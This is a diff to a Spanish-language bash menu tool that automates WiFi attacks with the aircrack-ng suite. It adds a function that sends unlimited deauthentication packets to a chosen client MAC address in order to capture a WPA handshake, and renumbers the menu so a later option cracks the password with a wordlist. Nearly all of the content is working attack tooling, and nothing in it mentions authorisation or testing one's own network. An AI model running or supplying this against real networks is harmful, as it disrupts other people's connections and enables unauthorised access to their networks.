@@ -123,20 +123,10 @@ wifiScanner(){
     cd /home/$userSystem/Escritorio/$folderName
     echo "A continuación vamos a ver la actividad sólo en $wifiName"
     echo " "
-    sleep 3
+    echo "Abra otra terminal, y dejando en ejecución este proceso ejecute la opción 5"
+    echo " "
+    sleep 5
     airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0
-    echo " "
-    echo -n "Escriba la dirección MAC del usuario al que desea deautenticar: "
-    read macClient
-    echo " "
-    echo "Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada"
-    echo " "
-    echo "Es recomendable esperar 1 minuto para que se genere el Handshake"
-    echo " "
-    echo "Cuando el minuto haya pasado, vuelva a ejecutar el programa y seleccione la opción 5"
-    echo " "
-    sleep 10
-    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one $monitor
 
   else
     echo " "
@@ -172,6 +162,38 @@ wifiPassword(){
   aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
   sleep 10
 
+}
+
+resetProgram(){
+
+  echo " "
+  echo "Esta opción deberías escogerla en caso de haber ya estado usando las anteriores"
+  sleep 4
+  echo " "
+  echo "Dando de baja el modo monitor..."
+  echo " "
+  sleep 3
+  airmon-ng stop $monitor
+
+}
+
+macAttack(){
+
+  echo " "
+  echo -n "Introduzca nombre del Wifi: "
+  read wifiName
+  echo " "
+  echo -n "Escriba la dirección MAC del usuario al que desea deautenticar: "
+  read macClient
+  echo " "
+  echo "Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada"
+  echo " "
+  echo "Es recomendable esperar 1 minuto para que se genere el Handshake"
+  echo " "
+  echo "Cuando el minuto haya pasado, vuelva a ejecutar el programa desde otra terminal y seleccione la opción 5"
+  echo " "
+  sleep 10
+  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
 
 }
 
@@ -186,7 +208,9 @@ while true
     echo "2. Mostrar interfaces"
     echo "3. Dar de baja el modo monitor"
     echo "4. Escanear redes wifis"
-    echo "5. Obtener contraseña Wifi"
+    echo "5. Deautenticación a dirección MAC"
+    echo "6. Obtener contraseña Wifi"
+    echo "7. Reiniciar programa"
     echo "---------------------------"
     echo "0. Salir "
     echo "---------------------------"
@@ -207,7 +231,13 @@ while true
       wifiScanner
     fi
     if [ "$opcionMenu" = "5" ]; then
+      macAttack
+    fi
+    if [ "$opcionMenu" = "6" ]; then
       wifiPassword
+    fi
+    if [ "$opcionMenu" = "7" ]; then
+      resetProgram
     fi
     if [ "$opcionMenu" = "0" ]; then
       echo " "
